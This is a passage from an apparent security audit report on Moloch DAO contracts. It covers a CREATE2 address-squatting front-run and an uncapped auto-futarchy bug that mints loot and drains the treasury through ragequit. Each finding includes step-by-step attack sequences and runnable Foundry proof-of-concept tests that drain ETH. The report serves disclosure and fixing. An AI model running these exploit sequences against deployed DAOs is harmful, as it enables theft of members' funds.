    orgURI,
    quorumBps,
    ragequittable,
    renderer,
    salt,
    initHolders,
    initShares,
    calls
);
```

**After**
```solidity
function _boundSalt(
    bytes32 userSalt,
    address caller,
    string calldata orgName,
    string calldata orgSymbol,
    string calldata orgURI,
    uint16 quorumBps,
    bool ragequittable,
    address renderer,
    Call[] memory calls
) internal pure returns (bytes32) {
    return keccak256(
        abi.encode(
            caller,
            userSalt,
            orgName,
            orgSymbol,
            orgURI,
            quorumBps,
            ragequittable,
            renderer,
            keccak256(abi.encode(calls))
        )
    );
}

bytes32 boundSalt = _boundSalt(
    salt,
    msg.sender,
    orgName,
    orgSymbol,
    orgURI,
    quorumBps,
    ragequittable,
    renderer,
    calls
);

address daoAddr = _predictDAO(boundSalt, initHolders, initShares);

dao = SUMMONER.summon{value: msg.value}(
    orgName,
    orgSymbol,
    orgURI,
    quorumBps,
    ragequittable,
    renderer,
    boundSalt,
    initHolders,
    initShares,
    calls
);
```

If deterministic pre-funding by third parties is an intended feature, use a two-step commit/reveal or a dedicated wrapper-owned factory that reserves salts before revealing the final deployment parameters.

##### Security Principle
CREATE2 addresses are only trustworthy when the address namespace is bound to the full security-relevant deployment intent. Binding the caller and init payload prevents an attacker from reusing a victim's visible salt inputs to claim the same address with different privileged initialization.

##### Defense in Depth
- Add regression tests proving that different callers or different init call bundles produce different predicted addresses even when `salt`, `initHolders`, and `initShares` are identical.
- Warn UI users not to pre-fund or trust predicted DAO addresses until the deployment transaction is finalized and the on-chain init state is verified.
- Consider private transaction submission support for deployments to reduce mempool visibility, while keeping on-chain binding as the primary control.

##### Verification Guidance
- Add a test where an attacker reuses the victim's `salt`, `initHolders`, and `initShares` but changes `msg.sender` or `initCalls`; the predicted address must differ and both deployments must be able to coexist.
- Add a test showing the same caller with the same full configuration still gets a stable deterministic address across repeated off-chain predictions.
- Add a regression test proving a malicious frontrunner can no longer cause the victim deployment to revert by copying only the original three address-derivation inputs.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
git clone <REPO_URL>
cd <REPO_DIR>
export MAINNET_RPC_URL="https://<your-mainnet-rpc>"
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call, ISummoner, IMoloch} from "../src/peripheral/SafeSummoner.sol";

contract SafeSummonerFrontRunPoC is Test {
    SafeSummoner internal safe;
    ISummoner constant SUMMONER =
        ISummoner(0x0000000000330B8df9E3bc5E553074DA58eE9138);

    address internal attacker = address(0xBEEF);
    address internal victimHolder = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        safe = new SafeSummoner();
        vm.deal(attacker, 1 ether);
        vm.deal(address(this), 2 ether);
    }

    function test_FrontRunSquatsPredictedDaoAndInstallsDrain() public {
        address[] memory holders = new address[](1);
        holders[0] = victimHolder;

        uint256[] memory shares = new uint256[](1);
        shares[0] = 100e18;

        bytes32 salt = keccak256("victim salt");
        address predicted = safe.predictDAO(salt, holders, shares);

        // Attacker uses the same salt/initHolders/initShares so CREATE2 lands
        // on the exact address the victim expects, but installs malicious init state.
        Call[] memory malicious = new Call[](1);
        malicious[0] = Call({
            target: predicted,
            value: 0,
            data: abi.encodeCall(IMoloch.setAllowance, (attacker, address(0), 1 ether))
        });

        vm.prank(attacker);
        address squatted = SUMMONER.summon(
            "Attacker DAO",
            "PWN",
            "",
            0,
            false,
            address(0),
            salt,
            holders,
            shares,
            malicious
        );
        assertEq(squatted, predicted, "attacker wins victim-expected address");

        // Victim now cannot deploy their intended safe DAO at the same address.
        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;

        vm.expectRevert();
        safe.safeSummon(
            "Victim DAO",
            "SAFE",
            "",
            1000,
            true,
            address(0),
            salt,
            holders,
            shares,
            cfg,
            new Call[](0)
        );

        // Any later ETH sent to the trusted/predicted address can be drained
        // using the attacker-installed allowance.
        payable(predicted).transfer(1 ether);

        uint256 beforeBal = attacker.balance;
        vm.prank(attacker);
        Moloch(payable(predicted)).spendAllowance(address(0), 1 ether);
        assertEq(attacker.balance, beforeBal + 1 ether, "attacker drains later funding");
    }
}
```

##### Steps
1. **Save the PoC test as `test/SafeSummonerFrontRunPoC.t.sol`.**
- Expected: the repository now contains a single self-contained test demonstrating the race.
2. **Run the PoC on a mainnet fork.**
```bash
forge test --fork-url "$MAINNET_RPC_URL" --match-test test_FrontRunSquatsPredictedDaoAndInstallsDrain -vvv
```
- Expected: the test passes.
3. **Observe the attack phases in the assertions.**
- Expected: `squatted == predicted`, the victim `safe.safeSummon(...)` reverts, and the attacker balance increases by `1 ether` after `spendAllowance`.

##### Verification
Confirm that the first deployment at the predicted address comes from the attacker path, not the victim path. Then confirm the victim deployment reverts on CREATE2 collision and that the attacker can successfully withdraw ETH from the squatted DAO using the allowance installed during malicious initialization.

##### Outcome
The attacker permanently occupies the DAO address the victim expected to own, preventing the legitimate deployment at that address and allowing attacker-chosen initialization to govern future interactions with that address. If any users or integrations later trust or fund that deterministic address, the attacker can abuse the preinstalled rights to extract or redirect value.

</details>

---

<details>
<summary><strong>7. Uncapped auto-futarchy minted-loot rewards enable repeated ragequit-based treasury drain</strong></summary>

> **Review: Duplicate of KF#3 + KF#11. Severity adjusted to Low (configuration-dependent, mitigated by SafeSummoner).** This is the auto-futarchy farming / NO-coalition treasury drain class found by 9+ prior audits: Octane (#4 — earliest detailed articulation), Pashov, Forefy, QuillShield, ChatGPT, ChatGPT Pro, Qwen, Archethect V2, Almanax, Grimoire, Solarizer. KF#3 documents this as Design: "a majority NO coalition can also collect auto-funded pools by repeatedly defeating proposals — this is by design (NO voters are rewarded for correct predictions)." Mitigated by `proposalThreshold > 0` (KF#11), `autoFutarchyCap` (per-proposal bound), and SafeSummoner enforcement. The ragequit extraction angle is KF#3 (ragequit drains futarchy pools — by design). **Severity: Low (per KF#3 + KF#11, configuration-dependent).**

**Winfunc ID:** `29`

**CVSS Score:** `8.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`

**Vulnerability Type:** `CWE-770: Allocation of Resources Without Limits or Throttling`

**Source Location:** `src/Moloch.sol:278:openProposal()`

**Sink Location:** `src/Moloch.sol:794:ragequit()`

#### Summary

An attacker with enough shares to open and quorum proposals can repeatedly exploit auto-futarchy in the DAO, leading to treasury extraction by minting ragequittable loot from unbacked futarchy pools.

#### Root Cause

`openProposal()` reads `autoFutarchyParam`, coerces an unset `rewardToken` to sentinel `address(1007)`, and increases `futarchy[id].pool` from pure accounting state (`F.pool += amt`) without requiring any backing asset or nonzero cap for that minting path. Later, `cashOutFutarchy()` calls `_payout()` with that sentinel, which mints fresh loot instead of transferring a finite treasury balance, and `ragequit()` lets holders burn that loot for a pro-rata share of real DAO assets.

Because `openProposal(uint256 id)` accepts arbitrary ids and `resolveFutarchyNo()` can finalize defeated or expired proposals, a threshold/quorum holder can farm the NO side on throwaway proposal ids without needing to execute a real governance action. The attacker's original shares are never consumed by the cash-out path, so the process can be repeated across new ids.

#### Impact

###### Confirmed Impact
If `ragequittable` is enabled and the DAO treasury holds ETH or ERC20 assets, a quorum-capable holder can mint loot via repeated futarchy cash-outs and then ragequit that loot for real treasury assets. This allows repeated treasury depletion while the attacker retains the shares used to satisfy proposal threshold and quorum.

###### Potential Follow-On Impact
If the attacker leaves some minted loot outstanding between rounds, later `openProposal()` calls may calculate larger auto-futarchy pools because the basis includes current loot supply for `address(1007)`. Even when immediate treasury withdrawal is unavailable, the same flaw can still dilute existing members by minting unbacked loot claims that may become redeemable if ragequit is later enabled or treasury composition changes.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:278](../src/Moloch.sol#L278)**

   ```solidity
   function openProposal(uint256 id) public {
   ```

   A public caller that meets the current threshold can choose an arbitrary proposal id. The function does not verify that `id` corresponds to a real executable governance intent.

2. **[src/Moloch.sol:310](../src/Moloch.sol#L310)**

   ```solidity
   rt = (rt == address(0) ? address(1007) : rt);
   ```

   If no reward token was configured, auto-futarchy silently switches to sentinel `address(1007)`, which later means 'mint loot' rather than 'transfer ETH'.

3. **[src/Moloch.sol:336](../src/Moloch.sol#L336)**

   ```solidity
   F.pool += amt; // earmark only
   ```

   The proposal's futarchy pool is increased from accounting state only. For sentinel `address(1007)`, no backing treasury balance or mint budget is checked, and with `autoFutarchyCap == 0` the amount is uncapped.

4. **[src/Moloch.sol:389](../src/Moloch.sol#L389)**

   ```solidity
   _mint6909(msg.sender, rid, weight);
   ```

   When the attacker votes the NO side, they receive winning-side claim receipts proportional to their share voting weight.

5. **[src/Moloch.sol:580](../src/Moloch.sol#L580)**

   ```solidity
   _finalizeFutarchy(id, F, 0);
   ```

   Once the attacker has enough NO votes to defeat the proposal, anyone can finalize the NO side as the winner.

6. **[src/Moloch.sol:620](../src/Moloch.sol#L620)**

   ```solidity
   ppu = mulDiv(pool, 1e18, winSupply);
   ```

   Resolution turns the unbacked `F.pool` accounting value into a payout-per-receipt conversion rate for the winning side.

7. **[src/Moloch.sol:602](../src/Moloch.sol#L602)**

   ```solidity
   _payout(F.rewardToken, msg.sender, payout);
   ```

   Cashing out winning receipts routes the calculated payout into the configured reward token path.

8. **[src/Moloch.sol:995](../src/Moloch.sol#L995)**

   ```solidity
   loot.mintFromMoloch(to, amount);
   ```

   Because the reward token was coerced to `address(1007)`, `_payout()` mints fresh loot instead of transferring a finite asset from treasury.

9. **[src/Moloch.sol:791](../src/Moloch.sol#L791)**

   ```solidity
   due = mulDiv(pool, amt, total);
   ```

   `ragequit()` treats the newly minted loot as part of the DAO capital structure and computes a pro-rata claim on real treasury balances.

10. **[src/Moloch.sol:794](../src/Moloch.sol#L794)**

   ```solidity
   _payout(tk, msg.sender, due);
   ```

   The attacker burns the freshly minted loot and receives ETH/ERC20 treasury assets, completing the drain.

#### Exploit Analysis

##### Attack Narrative
The attacker is a minority share holder in a DAO that has enabled auto-futarchy with `autoFutarchyParam > 0`, left the reward token unset (or explicitly set it to `address(1007)`), and enabled ragequit. Instead of targeting a real governance action, the attacker opens an arbitrary proposal id, votes the NO side with enough weight to satisfy threshold and quorum, lets the proposal enter the defeated state, and resolves futarchy in favor of the NO receipts.

That resolution turns an unbacked accounting pool into a cash-out rate. Because the reward token was routed to sentinel `address(1007)`, `cashOutFutarchy()` mints fresh loot rather than spending a finite asset. The attacker then ragequits that loot for a pro-rata share of real ETH/ERC20 treasury balances, while keeping the original shares that made the proposal possible. Repeating the process on new ids drains additional treasury value.

##### Prerequisites
- **Attacker Control/Position:** The attacker controls an address with enough shares/delegated votes to satisfy `proposalThreshold` (if set) and the DAO's quorum on the NO side.
- **Required Access/Placement:** Authenticated as a normal token holder; no DAO self-call or admin key required.
- **User Interaction:** None.
- **Privileges/Configuration Required:** `autoFutarchyParam > 0`; reward token unset or `address(1007)`; a cap of `0` leaves the pool uncapped; `ragequittable == true`; treasury contains withdrawable ETH/ERC20 assets.
- **Knowledge Required:** The attacker must know the DAO is configured with vulnerable auto-futarchy settings and understand the threshold/quorum needed to defeat a proposal.
- **Attack Complexity:** Low — once the configuration exists, the on-chain sequence is deterministic and can even use arbitrary proposal ids that are never executable.

##### Attack Steps
1. Acquire or control enough shares to satisfy the DAO's proposal threshold and quorum requirements.
2. Call `openProposal(id)` with an arbitrary `id` so auto-futarchy earmarks a pool for that proposal.
3. Call `castVote(id, 0)` to mint NO-side receipts and make the proposal `Defeated` once quorum is met.
4. Call `resolveFutarchyNo(id)` to finalize the NO side as the winner.
5. Call `cashOutFutarchy(id, amount)` to burn the winning receipts and receive minted loot via `_payout(address(1007), ...)`.
6. Call `ragequit(tokens, 0, mintedLoot)` to burn the loot and withdraw a pro-rata share of real treasury assets.
7. Repeat the same sequence on new arbitrary ids because the original shares were never consumed.

##### Impact Breakdown
- **Confirmed Impact:** Repeated withdrawal of ETH/ERC20 treasury assets from a ragequittable DAO using only a reusable threshold/quorum share position and public futarchy entrypoints.
- **Potential Follow-On Impact:** If minted loot is left outstanding between rounds, later auto-futarchy pool calculations may grow because the basis includes loot supply for `address(1007)`. Even before treasury withdrawal, existing members are economically diluted by unbacked loot issuance.
- **Confidentiality:** None — the exploit does not expose private data.
- **Integrity:** High — the attacker can create unbacked claims and redirect treasury value contrary to intended governance budgeting.
- **Availability:** High — treasury assets can be progressively depleted, reducing or eliminating funds available for legitimate DAO operations.

#### Recommended Fix

Enforce this invariant inside `Moloch` itself, not only in `SafeSummoner`: auto-futarchy must never create redeemable payout pools from unbacked minting sentinels. At minimum, reject `autoFutarchyParam > 0` when the effective reward token is the default minted-loot sentinel and no explicit budget exists. A stronger fix is to disallow minted sentinels (`address(1007)` / `address(this)`) for auto-futarchy altogether unless they are backed by a separately tracked global mint budget that is decremented on each proposal.

**Before:**
```solidity
function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}
```

**After (minimum hardening):**
```solidity
error FutarchyCapRequired();
error UnbackedAutoFutarchyReward();

function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    address rt = rewardToken == address(0) ? address(1007) : rewardToken;
    if (param != 0) {
        if (cap == 0) revert FutarchyCapRequired();
        if (rt == address(1007) || rt == address(this)) {
            revert UnbackedAutoFutarchyReward();
        }
    }
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}
```

Also remove the ability to farm throwaway ids by requiring futarchy to bind to a real proposal intent before opening or resolving the pool. For example, only open futarchy for ids derived from `(op,to,value,data,nonce)` that have been explicitly registered by the DAO, rather than accepting arbitrary `uint256 id` values.

##### Security Principle
Payout mechanisms must be backed by a finite resource. If a governance workflow can mint a redeemable claim without consuming a scarce asset or budget, then any public caller who can reach that workflow can convert bookkeeping entries into real value.

##### Defense in Depth
- Track a dedicated global futarchy mint budget for sentinel reward tokens and decrement it when proposals are opened or cashed out; revert once exhausted.
- Require proposal ids to be bound to real call data before they can receive auto-futarchy pools or NO-side resolution, preventing farmable fake ids.
- Emit explicit alerts or block configuration changes when `rewardToken` resolves to `address(1007)` / `address(this)` while ragequit is enabled.

##### Verification Guidance
- Add a regression test proving `setAutoFutarchy(param > 0, 0)` reverts in core `Moloch`, not just in `SafeSummoner`.
- Add a regression test showing that an attacker cannot open arbitrary defeated proposals, cash out minted loot, and ragequit treasury assets under auto-futarchy.
- Keep a positive test showing legitimate ETH/ERC20-backed futarchy pools still resolve and cash out correctly for real proposals.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:** run inside the repository root
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch, Summoner, Call, Loot} from "../src/Moloch.sol";
import {Renderer} from "../src/Renderer.sol";

contract AutoFutarchyDrainPoC is Test {
    address alice = address(0xA11CE); // attacker / majority NO coalition
    address bob = address(0xB0B);     // honest minority holder

    function test_uncappedAutoFutarchyDrainsTreasury() public {
        Summoner summoner = new Summoner();
        Renderer renderer = new Renderer();

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 60e18;
        amounts[1] = 40e18;

        Moloch dao = summoner.summon(
            "Unsafe DAO",
            "UNSAFE",
            "",
            5000, // 50% quorum
            true, // ragequittable
            address(renderer),
            bytes32(0),
            holders,
            amounts,
            new Call[](0)
        );

        Loot loot = dao.loot();
        vm.deal(address(dao), 100 ether);

        // Model a DAO-approved config set either via raw initCalls or a passed proposal.
        vm.prank(address(dao));
        dao.setAutoFutarchy(1000, 0); // 10% of snapshot supply, uncapped
        // rewardToken remains its default address(0), which openProposal() rewrites to address(1007)
        vm.roll(block.number + 1);

        address[] memory tokens = new address[](1);
        tokens[0] = address(0);

        for (uint256 i; i < 5; ++i) {
            uint256 id = dao.proposalId(0, address(0xBEEF), 0, hex"", bytes32(uint256(i + 1)));

            vm.prank(alice);
            dao.openProposal(id);

            vm.prank(alice);
            dao.castVote(id, 0); // NO with 60% => proposal is Defeated at 50% quorum

            dao.resolveFutarchyNo(id);

            uint256 receiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
            uint256 receiptBal = dao.balanceOf(alice, receiptId);

            vm.prank(alice);
            dao.cashOutFutarchy(id, receiptBal); // mints ~10e18 loot each round

            uint256 lootBal = loot.balanceOf(alice);
            vm.prank(alice);
            dao.ragequit(tokens, 0, lootBal); // convert synthetic loot into real ETH
        }

        emit log_named_uint("Treasury remaining", address(dao).balance);
        emit log_named_uint("Bob original pro-rata claim", 40 ether);
        emit log_named_uint("Bob new pro-rata claim", (address(dao).balance * 40) / 100);

        // After 5 rounds only ~62.09 ETH remains.
        assertLt(address(dao).balance, 63 ether);
    }
}
```

##### Steps
1. **Add the PoC test file** under `test/AutoFutarchyDrainPoC.t.sol`.
- Expected: the repository still builds successfully.
2. **Run the PoC**
```bash
forge test --match-test test_uncappedAutoFutarchyDrainsTreasury -vv
```
- Expected: the test passes and logs that the DAO treasury has fallen below `63 ether` after five defeated proposals.
3. **Inspect the attacker and victim economics**
- Expected: Alice repeatedly receives minted loot from `cashOutFutarchy()` and converts it into ETH via `ragequit()`, while Bob’s residual pro-rata treasury claim falls materially even though no proposal ever passes.

##### Verification
Confirm that each loop iteration produces a new proposal ID, reaches `Defeated`, resolves NO, mints loot to Alice, and decreases `address(dao).balance` after ragequit. The final treasury balance below `63 ether` demonstrates repeatability rather than a one-off accounting anomaly.

##### Outcome
The attacker converts repeated proposal defeats into synthetic loot rewards and then burns that loot for real treasury assets. Honest holders are diluted economically: their share of the remaining treasury shrinks every round even though the attacker never needs to pass a governance action.

</details>

---

<details>
<summary><strong>8. Uncapped auto-futarchy default reward path enables NO-side loot farming and treasury dilution</strong></summary>

> **Review: Duplicate of KF#3 + KF#11 (same root cause as #7). Severity adjusted to Low.** Same auto-futarchy minted-reward farming class documented in KF#3. The "default reward path" framing (when `rewardToken = address(0)` → minted Loot via `address(1007)`) is the specific variant previously documented by Octane, Pashov, and ChatGPT Pro. Mitigated by the same SafeSummoner guardrails. **Severity: Low (per KF#3 + KF#11).**

**Winfunc ID:** `28`

**CVSS Score:** `7.8`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H`

**Vulnerability Type:** `CWE-840: Business Logic Errors`

**Source Location:** `src/Moloch.sol:863:setAutoFutarchy()`

**Sink Location:** `src/Moloch.sol:994:_payout()`

#### Summary

An attacker with enough voting power can repeatedly force defeated proposals in Moloch and cash out uncapped auto-futarchy rewards, leading to unbounded loot inflation and, on ragequittable deployments, treasury extraction.

#### Root Cause

`setAutoFutarchy()` accepts `param > 0` with `cap == 0` and stores that configuration without validation. When `openProposal()` later sees `rewardToken == address(0)`, it silently rewrites the reward asset to `address(1007)` (the minted-loot sentinel), computes the auto-futarchy amount from snapshot supply, and only applies a cap if `autoFutarchyCap != 0`; unlike local shares/loot reward modes, there is no DAO-balance clamp for `address(1007)`. After a proposal is resolved on the NO side, `cashOutFutarchy()` routes the payout into `_payout()`, which mints loot for `address(1007)` from thin air.

#### Impact

###### Confirmed Impact
A holder or coalition that can repeatedly produce `Defeated`/`Expired` proposals can mint unbounded NO-side loot rewards across arbitrarily many proposal IDs without ever passing a proposal. This dilutes the DAO’s economic accounting and can also be used to manufacture additional non-voting exit claims.

###### Potential Follow-On Impact
If the DAO is ragequittable, the synthetic loot can be burned in `ragequit()` for pro-rata treasury withdrawals, steadily shifting value from honest holders to the attacker over repeated rounds. If the DAO instead uses the minted-shares sentinel (`address(this)`), the same missing cap pattern can inflate voting power directly, worsening governance capture risk.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:864](../src/Moloch.sol#L864)**

   ```solidity
   (autoFutarchyParam, autoFutarchyCap) = (param, cap);
   ```

   The DAO can enable auto-futarchy with `param > 0` and `cap == 0`; the core setter performs no validation to forbid uncapped reward creation.

2. **[src/Moloch.sol:310](../src/Moloch.sol#L310)**

   ```solidity
   rt = (rt == address(0) ? address(1007) : rt);
   ```

   When a proposal is opened and the global reward token is the default `address(0)`, the auto-futarchy path silently rewrites the reward asset to the minted-loot sentinel `address(1007)`.

3. **[src/Moloch.sol:327](../src/Moloch.sol#L327)**

   ```solidity
   if (cap != 0 && amt > cap) amt = cap;
   ```

   The only hard bound is conditional on `cap != 0`; with `cap == 0`, the computed amount is left untouched.

4. **[src/Moloch.sol:336](../src/Moloch.sol#L336)**

   ```solidity
   F.pool += amt; // earmark only
   ```

   The uncapped amount is stored as the per-proposal futarchy pool, creating a synthetic NO/YES reward pot for this proposal.

5. **[src/Moloch.sol:580](../src/Moloch.sol#L580)**

   ```solidity
   _finalizeFutarchy(id, F, 0);
   ```

   If the proposal ends `Defeated` or `Expired`, anyone can finalize the NO side as winner and lock in payout accounting for the synthetic pool.

6. **[src/Moloch.sol:602](../src/Moloch.sol#L602)**

   ```solidity
   _payout(F.rewardToken, msg.sender, payout);
   ```

   A NO-side winner burns their receipt and routes the computed payout to the configured reward token sink.

7. **[src/Moloch.sol:995](../src/Moloch.sol#L995)**

   ```solidity
   loot.mintFromMoloch(to, amount);
   ```

   For `address(1007)`, the sink mints new loot from thin air. That minted loot can then be used as a pro-rata ragequit claim if ragequit is enabled.

#### Exploit Analysis

##### Attack Narrative
The attacker is a public DAO participant who can acquire or coordinate enough voting power to make proposals fail. Once the DAO has been deployed or reconfigured with `autoFutarchyParam > 0` and `autoFutarchyCap == 0`, the attacker does not need any further privileged call: `openProposal()`, `castVote()`, `resolveFutarchyNo()`, and `cashOutFutarchy()` are all publicly reachable under normal proposal lifecycle rules.

The critical twist is that the default `rewardToken == address(0)` does not behave like ETH inside the auto-futarchy path. `openProposal()` rewrites it to `address(1007)`, so every defeated proposal can manufacture a synthetic loot reward pool sized off total supply. The attacker can then vote NO, resolve the proposal as defeated, burn the NO receipt, and receive freshly minted loot. If ragequit is enabled, that loot is immediately convertible into treasury assets. Repeating the cycle across fresh nonces compounds the drain.

##### Prerequisites
- **Attacker Control/Position:** Control of enough shares (or a coalition) to make target proposals end in `Defeated` or `Expired`, and optionally enough current votes to satisfy `proposalThreshold` if non-zero
- **Required Access/Placement:** Unauthenticated public user able to acquire/borrow governance power; no admin keys required after unsafe configuration exists
- **User Interaction:** None
- **Privileges/Configuration Required:** DAO must have `autoFutarchyParam > 0` with `autoFutarchyCap == 0`; the default `rewardToken` must remain `address(0)` or another minted sentinel path must be used; treasury extraction additionally requires `ragequittable == true`
- **Knowledge Required:** Ability to read on-chain config (`autoFutarchyParam`, `autoFutarchyCap`, `rewardToken`, quorum settings, ragequit flag)
- **Attack Complexity:** High — the attacker needs an unsafe deployment/configuration and sufficient governance weight to reliably produce NO-winning defeats, but the transaction sequence itself is straightforward once those conditions hold

##### Attack Steps
1. Deploy or identify a DAO configured via raw `Summoner.summon()`/`initCalls` or later governance so that `setAutoFutarchy(param > 0, 0)` has succeeded.
2. Leave `rewardToken` at its default `address(0)` (or explicitly set it there), so `openProposal()` will translate it into the minted-loot sentinel `address(1007)`.
3. Open arbitrary proposal IDs with fresh nonces; each `openProposal()` call snapshots supply and auto-creates an uncapped futarchy pool sized from total supply.
4. Vote NO with enough weight to satisfy quorum and make the proposal `Defeated` (or wait for `Expired` if that route is easier).
5. Call `resolveFutarchyNo(id)` to finalize the NO side as winner.
6. Call `cashOutFutarchy(id, receiptBalance)` to burn the NO receipt and mint loot via `_payout(address(1007), ...)`.
7. If ragequit is enabled, burn the minted loot in `ragequit()` against treasury tokens.
8. Repeat steps 3-7 with new proposal IDs to continue extracting value.

##### Impact Breakdown
- **Confirmed Impact:** Repeated defeated proposals can mint effectively unbounded NO-side loot rewards, inflating supply and diluting DAO economics without any successful proposal execution.
- **Potential Follow-On Impact:** On ragequittable DAOs, the minted loot can be converted into real ETH/ERC20 treasury outflows; on deployments using minted shares instead of minted loot, the same pattern can inflate voting power directly.
- **Confidentiality:** None — the code path does not expose secrets.
- **Integrity:** High — the attacker can manufacture new economic claims and distort governance/treasury accounting.
- **Availability:** High — repeated ragequit conversions can materially deplete treasury assets and impair the DAO’s ability to operate.

#### Recommended Fix

The minimum safe fix is to reject uncapped auto-futarchy in core, not only in `SafeSummoner`. Today the core setter blindly accepts `cap == 0`, which leaves minted reward modes (`address(1007)` and `address(this)`) unconstrained. Enforce a non-zero cap whenever `param != 0`, and consider removing the silent `address(0) -> address(1007)` rewrite so minted rewards must be chosen explicitly.

**Before**
```solidity
function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}
```

**After**
```solidity
function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    if (param != 0 && cap == 0) revert NotOk();
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}
```

A stronger hardening change is to make minted reward modes explicit and gate them more tightly in `openProposal()`.

**Before**
```solidity
address rt = rewardToken;
rt = (rt == address(0) ? address(1007) : rt);
```

**After**
```solidity
address rt = rewardToken;
if (autoFutarchyParam != 0 && (rt == address(this) || rt == address(1007))) {
    if (autoFutarchyCap == 0) revert NotOk();
    if (proposalThreshold == 0) revert Unauthorized();
}
```

##### Security Principle
Economic reward creation must be bounded at the core contract layer, not only in deployment wrappers. When special sentinel values mint assets instead of transferring pre-existing balances, the protocol must apply explicit issuance limits or the reward mechanism becomes an inflation primitive.

##### Defense in Depth
- Add a **global aggregate auto-futarchy budget** so repeated proposal openings cannot compound unlimited exposure even when per-proposal caps are present.
- Require **explicit selection of minted reward sentinels** (`address(this)` / `address(1007)`) and emit dedicated events for those modes; do not overload `address(0)` with different meanings in different code paths.
- Require **non-zero `proposalThreshold`** whenever minted auto-futarchy is enabled, so arbitrary low-stake accounts cannot mass-open reward-bearing proposals.
- Add monitoring that alerts when `autoFutarchyParam > 0`, especially if the reward mode is minted rather than pre-funded.

##### Verification Guidance
- Add a regression test proving `setAutoFutarchy(1000, 0)` reverts in core Moloch, not just in `SafeSummoner`.
- Add a regression test proving `openProposal()` cannot create a non-zero `futarchy[id].pool` for minted reward modes unless the configured cap is non-zero.
- Keep a positive test for legitimate capped modes: e.g. local `address(loot)` or `address(shares)` pools still open and cash out correctly within bounds.
- Add a multi-round invariant test showing repeated defeated proposals cannot inflate more total reward than the configured per-proposal and aggregate caps allow.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:** run inside the repository root
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch, Summoner, Call, Loot} from "../src/Moloch.sol";
import {Renderer} from "../src/Renderer.sol";

contract AutoFutarchyDrainPoC is Test {
    address alice = address(0xA11CE); // attacker / majority NO coalition
    address bob = address(0xB0B);     // honest minority holder

    function test_uncappedAutoFutarchyDrainsTreasury() public {
        Summoner summoner = new Summoner();
        Renderer renderer = new Renderer();

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 60e18;
        amounts[1] = 40e18;

        Moloch dao = summoner.summon(
            "Unsafe DAO",
            "UNSAFE",
            "",
            5000, // 50% quorum
            true, // ragequittable
            address(renderer),
            bytes32(0),
            holders,
            amounts,
            new Call[](0)
        );

        Loot loot = dao.loot();
        vm.deal(address(dao), 100 ether);

        // Model a DAO-approved config set either via raw initCalls or a passed proposal.
        vm.prank(address(dao));
        dao.setAutoFutarchy(1000, 0); // 10% of snapshot supply, uncapped
        // rewardToken remains its default address(0), which openProposal() rewrites to address(1007)
        vm.roll(block.number + 1);

        address[] memory tokens = new address[](1);
        tokens[0] = address(0);

        for (uint256 i; i < 5; ++i) {
            uint256 id = dao.proposalId(0, address(0xBEEF), 0, hex"", bytes32(uint256(i + 1)));

            vm.prank(alice);
            dao.openProposal(id);

            vm.prank(alice);
            dao.castVote(id, 0); // NO with 60% => proposal is Defeated at 50% quorum

            dao.resolveFutarchyNo(id);

            uint256 receiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
            uint256 receiptBal = dao.balanceOf(alice, receiptId);

            vm.prank(alice);
            dao.cashOutFutarchy(id, receiptBal); // mints ~10e18 loot each round

            uint256 lootBal = loot.balanceOf(alice);
            vm.prank(alice);
            dao.ragequit(tokens, 0, lootBal); // convert synthetic loot into real ETH
        }

        emit log_named_uint("Treasury remaining", address(dao).balance);
        emit log_named_uint("Bob original pro-rata claim", 40 ether);
        emit log_named_uint("Bob new pro-rata claim", (address(dao).balance * 40) / 100);

        // After 5 rounds only ~62.09 ETH remains.
        assertLt(address(dao).balance, 63 ether);
    }
}
```

##### Steps
1. **Add the PoC test file** under `test/AutoFutarchyDrainPoC.t.sol`.
- Expected: the repository still builds successfully.
2. **Run the PoC**
```bash
forge test --match-test test_uncappedAutoFutarchyDrainsTreasury -vv
```
- Expected: the test passes and logs that the DAO treasury has fallen below `63 ether` after five defeated proposals.
3. **Inspect the attacker and victim economics**
- Expected: Alice repeatedly receives minted loot from `cashOutFutarchy()` and converts it into ETH via `ragequit()`, while Bob’s residual pro-rata treasury claim falls materially even though no proposal ever passes.

